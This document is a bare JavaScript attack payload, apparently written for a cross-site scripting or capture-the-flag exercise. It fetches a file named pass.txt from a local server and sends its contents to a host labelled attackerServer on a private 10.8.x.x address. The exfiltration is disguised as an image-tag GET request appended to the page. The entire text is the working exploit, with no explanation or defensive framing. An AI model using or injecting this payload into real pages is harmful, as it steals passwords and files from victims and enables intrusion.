fetch('http://127.0.0.1/dir/pass.txt')
  .then(response => response.text())
  .then(data => {
    let attackerServer = 'http://10.8.xxx.xxx:80/catch?data=' + encodeURIComponent(data);
    // Use an Image tag for GET request
    let img = document.createElement('img');
    img.src = attackerServer;
    document.body.appendChild(img);
  });
